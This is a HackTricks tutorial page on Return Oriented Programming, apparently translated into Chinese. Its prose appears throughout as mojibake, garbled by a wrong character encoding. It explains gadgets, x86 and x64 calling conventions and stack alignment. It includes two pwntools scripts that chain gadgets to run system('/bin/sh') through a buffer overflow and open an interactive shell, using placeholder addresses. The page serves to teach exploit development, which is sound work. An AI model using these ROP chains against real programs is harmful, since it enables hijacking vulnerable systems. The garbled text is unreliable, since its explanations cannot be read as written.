# ROP - Return Oriented Programing

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **åŸºæœ¬ä¿¡æ¯**

**è¿”å›å¯¼å‘ç¼–ç¨‹ (ROP)** æ˜¯ä¸€ç§é«˜çº§åˆ©ç”¨æŠ€æœ¯ï¼Œç”¨äºç»•è¿‡ **ä¸å¯æ‰§è¡Œ (NX)** æˆ– **æ•°æ®æ‰§è¡Œä¿æŠ¤ (DEP)** ç­‰å®‰å…¨æªæ–½ã€‚æ”»å‡»è€…ä¸å†æ³¨å…¥å’Œæ‰§è¡Œ shellcodeï¼Œè€Œæ˜¯åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å·²åŠ è½½åº“ä¸­å·²ç»å­˜åœ¨çš„ä»£ç ç‰‡æ®µï¼Œç§°ä¸º **â€œå°å·¥å…·â€**ã€‚æ¯ä¸ªå°å·¥å…·é€šå¸¸ä»¥ `ret` æŒ‡ä»¤ç»“æŸï¼Œå¹¶æ‰§è¡Œå°çš„æ“ä½œï¼Œä¾‹å¦‚åœ¨å¯„å­˜å™¨ä¹‹é—´ç§»åŠ¨æ•°æ®æˆ–æ‰§è¡Œç®—æœ¯è¿ç®—ã€‚é€šè¿‡å°†è¿™äº›å°å·¥å…·ä¸²è”åœ¨ä¸€èµ·ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªæœ‰æ•ˆç»•è¿‡ NX/DEP ä¿æŠ¤çš„æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥æ‰§è¡Œä»»æ„æ“ä½œã€‚

### ROP çš„å·¥ä½œåŸç†

1. **æ§åˆ¶æµåŠ«æŒ**ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…éœ€è¦åŠ«æŒç¨‹åºçš„æ§åˆ¶æµï¼Œé€šå¸¸é€šè¿‡åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¥è¦†ç›–æ ˆä¸Šçš„ä¿å­˜è¿”å›åœ°å€ã€‚
2. **å°å·¥å…·é“¾**ï¼šæ”»å‡»è€…ç„¶åä»”ç»†é€‰æ‹©å¹¶é“¾å¼è¿æ¥å°å·¥å…·ä»¥æ‰§è¡Œæ‰€éœ€çš„æ“ä½œã€‚è¿™å¯èƒ½æ¶‰åŠä¸ºå‡½æ•°è°ƒç”¨è®¾ç½®å‚æ•°ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆä¾‹å¦‚ `system("/bin/sh")`ï¼‰ï¼Œå¹¶å¤„ç†ä»»ä½•å¿…è¦çš„æ¸…ç†æˆ–é™„åŠ æ“ä½œã€‚
3. **æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œ**ï¼šå½“æ˜“å—æ”»å‡»çš„å‡½æ•°è¿”å›æ—¶ï¼Œè€Œä¸æ˜¯è¿”å›åˆ°åˆæ³•ä½ç½®ï¼Œå®ƒå¼€å§‹æ‰§è¡Œå°å·¥å…·é“¾ã€‚

### å·¥å…·

é€šå¸¸ï¼Œå¯ä»¥ä½¿ç”¨ **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**ã€**[ropper](https://github.com/sashs/Ropper)** æˆ–ç›´æ¥ä» **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) æŸ¥æ‰¾å°å·¥å…·ã€‚

## x86 ç¤ºä¾‹ä¸­çš„ ROP é“¾

### **x86 (32ä½) è°ƒç”¨çº¦å®š**

* **cdecl**ï¼šè°ƒç”¨è€…æ¸…ç†æ ˆã€‚å‡½æ•°å‚æ•°ä»¥ç›¸åçš„é¡ºåºï¼ˆä»å³åˆ°å·¦ï¼‰æ¨é€åˆ°æ ˆä¸Šã€‚**å‚æ•°ä»å³åˆ°å·¦æ¨é€åˆ°æ ˆä¸Šã€‚**
* **stdcall**ï¼šç±»ä¼¼äº cdeclï¼Œä½†è¢«è°ƒç”¨è€…è´Ÿè´£æ¸…ç†æ ˆã€‚

### **æŸ¥æ‰¾å°å·¥å…·**

é¦–å…ˆï¼Œå‡è®¾æˆ‘ä»¬å·²ç»åœ¨äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å…¶åŠ è½½çš„åº“ä¸­è¯†åˆ«äº†å¿…è¦çš„å°å·¥å…·ã€‚æˆ‘ä»¬æ„Ÿå…´è¶£çš„å°å·¥å…·åŒ…æ‹¬ï¼š

* `pop eax; ret`ï¼šè¿™ä¸ªå°å·¥å…·å°†æ ˆé¡¶çš„å€¼å¼¹å‡ºåˆ° `EAX` å¯„å­˜å™¨ä¸­ï¼Œç„¶åè¿”å›ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ `EAX`ã€‚
* `pop ebx; ret`ï¼šä¸ä¸Šè¿°ç±»ä¼¼ï¼Œä½†ç”¨äº `EBX` å¯„å­˜å™¨ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ `EBX`ã€‚
* `mov [ebx], eax; ret`ï¼šå°† `EAX` ä¸­çš„å€¼ç§»åŠ¨åˆ° `EBX` æŒ‡å‘çš„å†…å­˜ä½ç½®ï¼Œç„¶åè¿”å›ã€‚è¿™é€šå¸¸è¢«ç§°ä¸º **å†™å…¥-ä»€ä¹ˆ-åœ¨å“ªé‡Œå°å·¥å…·**ã€‚
* æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜æœ‰ `system()` å‡½æ•°çš„åœ°å€å¯ç”¨ã€‚

### **ROP é“¾**

ä½¿ç”¨ **pwntools**ï¼Œæˆ‘ä»¬å‡†å¤‡æ ˆä»¥æ‰§è¡Œ ROP é“¾ï¼Œç›®æ ‡æ˜¯æ‰§è¡Œ `system('/bin/sh')`ï¼Œæ³¨æ„é“¾çš„å¼€å§‹ï¼š

1. ç”¨äºå¯¹é½ç›®çš„çš„ `ret` æŒ‡ä»¤ï¼ˆå¯é€‰ï¼‰
2. `system` å‡½æ•°çš„åœ°å€ï¼ˆå‡è®¾ ASLR è¢«ç¦ç”¨ä¸”å·²çŸ¥ libcï¼Œæ›´å¤šä¿¡æ¯è§ [**Ret2lib**](ret2lib/)ï¼‰
3. `system()` è¿”å›åœ°å€çš„å ä½ç¬¦
4. `"/bin/sh"` å­—ç¬¦ä¸²åœ°å€ï¼ˆç³»ç»Ÿå‡½æ•°çš„å‚æ•°ï¼‰
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) è°ƒç”¨çº¦å®š**

* åœ¨ç±»Unixç³»ç»Ÿä¸Šä½¿ç”¨**System V AMD64 ABI**è°ƒç”¨çº¦å®šï¼Œå…¶ä¸­**å‰å…­ä¸ªæ•´æ•°æˆ–æŒ‡é’ˆå‚æ•°é€šè¿‡å¯„å­˜å™¨`RDI`ã€`RSI`ã€`RDX`ã€`RCX`ã€`R8`å’Œ`R9`ä¼ é€’**ã€‚é¢å¤–çš„å‚æ•°é€šè¿‡æ ˆä¼ é€’ã€‚è¿”å›å€¼æ”¾åœ¨`RAX`ä¸­ã€‚
* **Windows x64**è°ƒç”¨çº¦å®šä½¿ç”¨`RCX`ã€`RDX`ã€`R8`å’Œ`R9`ä½œä¸ºå‰å››ä¸ªæ•´æ•°æˆ–æŒ‡é’ˆå‚æ•°ï¼Œé¢å¤–çš„å‚æ•°é€šè¿‡æ ˆä¼ é€’ã€‚è¿”å›å€¼æ”¾åœ¨`RAX`ä¸­ã€‚
* **å¯„å­˜å™¨**ï¼š64ä½å¯„å­˜å™¨åŒ…æ‹¬`RAX`ã€`RBX`ã€`RCX`ã€`RDX`ã€`RSI`ã€`RDI`ã€`RBP`ã€`RSP`ä»¥åŠ`R8`åˆ°`R15`ã€‚

#### **æŸ¥æ‰¾å°å·¥å…·**

ä¸ºäº†æˆ‘ä»¬çš„ç›®çš„ï¼Œè®©æˆ‘ä»¬ä¸“æ³¨äºå¯ä»¥è®©æˆ‘ä»¬è®¾ç½®**RDI**å¯„å­˜å™¨ï¼ˆä»¥å°†**"/bin/sh"**å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™**system()**ï¼‰å¹¶è°ƒç”¨**system()**å‡½æ•°çš„å°å·¥å…·ã€‚æˆ‘ä»¬å‡è®¾æˆ‘ä»¬å·²ç»è¯†åˆ«å‡ºä»¥ä¸‹å°å·¥å…·ï¼š

* **pop rdi; ret**ï¼šå°†æ ˆé¡¶å€¼å¼¹å‡ºåˆ°**RDI**ä¸­ï¼Œç„¶åè¿”å›ã€‚å¯¹äºè®¾ç½®**system()**çš„å‚æ•°è‡³å…³é‡è¦ã€‚
* **ret**ï¼šä¸€ä¸ªç®€å•çš„è¿”å›ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯¹æ ˆå¯¹é½å¾ˆæœ‰ç”¨ã€‚

æˆ‘ä»¬çŸ¥é“**system()**å‡½æ•°çš„åœ°å€ã€‚

### **ROPé“¾**

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨**pwntools**è®¾ç½®å’Œæ‰§è¡ŒROPé“¾çš„ç¤ºä¾‹ï¼Œæ—¨åœ¨æ‰§è¡Œ**system('/bin/sh')**åœ¨**x64**ä¸Šï¼š
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š

* æˆ‘ä»¬åˆ©ç”¨ **`pop rdi; ret`** gadget å°† **`RDI`** è®¾ç½®ä¸º **`"/bin/sh"`** çš„åœ°å€ã€‚
* åœ¨è®¾ç½® **`RDI`** åï¼Œæˆ‘ä»¬ç›´æ¥è·³è½¬åˆ° **`system()`**ï¼Œé“¾ä¸­åŒ…å« **system()** çš„åœ°å€ã€‚
* å¦‚æœç›®æ ‡ç¯å¢ƒéœ€è¦ï¼Œä½¿ç”¨ **`ret_gadget`** è¿›è¡Œå¯¹é½ï¼Œè¿™åœ¨ **x64** ä¸­æ›´ä¸ºå¸¸è§ï¼Œä»¥ç¡®ä¿åœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰æ­£ç¡®å¯¹é½æ ˆã€‚

### æ ˆå¯¹é½

**x86-64 ABI** ç¡®ä¿åœ¨æ‰§è¡Œ **call æŒ‡ä»¤** æ—¶ **æ ˆæ˜¯ 16 å­—èŠ‚å¯¹é½** çš„ã€‚**LIBC** ä¸ºäº†ä¼˜åŒ–æ€§èƒ½ï¼Œ**ä½¿ç”¨ SSE æŒ‡ä»¤**ï¼ˆå¦‚ **movaps**ï¼‰ï¼Œè¿™äº›æŒ‡ä»¤éœ€è¦è¿™ç§å¯¹é½ã€‚å¦‚æœæ ˆæ²¡æœ‰æ­£ç¡®å¯¹é½ï¼ˆæ„å‘³ç€ **RSP** ä¸æ˜¯ 16 çš„å€æ•°ï¼‰ï¼Œå¯¹ **system** ç­‰å‡½æ•°çš„è°ƒç”¨å°†åœ¨ **ROP é“¾** ä¸­å¤±è´¥ã€‚è¦è§£å†³æ­¤é—®é¢˜ï¼Œåªéœ€åœ¨è°ƒç”¨ **system** ä¹‹å‰åœ¨ ROP é“¾ä¸­æ·»åŠ ä¸€ä¸ª **ret gadget**ã€‚

## x86 ä¸ x64 çš„ä¸»è¦åŒºåˆ«

{% hint style="success" %}
ç”±äº x64 ä½¿ç”¨å¯„å­˜å™¨ä¼ é€’å‰å‡ ä¸ªå‚æ•°ï¼Œå› æ­¤åœ¨ç®€å•å‡½æ•°è°ƒç”¨ä¸­é€šå¸¸éœ€è¦çš„ gadget æ¯” x86 å°‘ï¼Œä½†ç”±äºå¯„å­˜å™¨æ•°é‡å¢åŠ å’Œåœ°å€ç©ºé—´æ›´å¤§ï¼Œæ‰¾åˆ°å’Œé“¾æ¥æ­£ç¡®çš„ gadget å¯èƒ½æ›´å¤æ‚ã€‚**x64** æ¶æ„ä¸­å¯„å­˜å™¨æ•°é‡çš„å¢åŠ å’Œåœ°å€ç©ºé—´çš„æ‰©å¤§ä¸ºæ¼æ´å¼€å‘æä¾›äº†æœºé‡å’ŒæŒ‘æˆ˜ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆROPï¼‰çš„èƒŒæ™¯ä¸‹ã€‚
{% endhint %}

## ä¿æŠ¤æªæ–½

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**æ ˆé‡‘ä¸é›€**](../common-binary-protections-and-bypasses/stack-canaries/)

## å…¶ä»–ç¤ºä¾‹ä¸å‚è€ƒ

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## åŸºäº ROP çš„æŠ€æœ¯

è¯·æ³¨æ„ï¼ŒROP åªæ˜¯æ‰§è¡Œä»»æ„ä»£ç çš„ä¸€ç§æŠ€æœ¯ã€‚åŸºäº ROP å¼€å‘äº†è®¸å¤š Ret2XXX æŠ€æœ¯ï¼š

* **Ret2lib**ï¼šä½¿ç”¨ ROP ä»åŠ è½½çš„åº“ä¸­è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå¸¦æœ‰ä»»æ„å‚æ•°ï¼ˆé€šå¸¸æ˜¯ç±»ä¼¼ `system('/bin/sh')` çš„ä¸œè¥¿ï¼‰ã€‚

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**ï¼šä½¿ç”¨ ROP å‡†å¤‡å¯¹ syscall çš„è°ƒç”¨ï¼Œä¾‹å¦‚ `execve`ï¼Œå¹¶ä½¿å…¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP é“¾æ¥**ï¼šç¬¬ä¸€ä¸ªå°†æ»¥ç”¨ EBP è€Œä¸æ˜¯ EIP æ¥æ§åˆ¶æµç¨‹ï¼Œç¬¬äºŒä¸ªç±»ä¼¼äº Ret2libï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµç¨‹ä¸»è¦é€šè¿‡ EBP åœ°å€æ§åˆ¶ï¼ˆå°½ç®¡ä¹Ÿéœ€è¦æ§åˆ¶ EIPï¼‰ã€‚

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
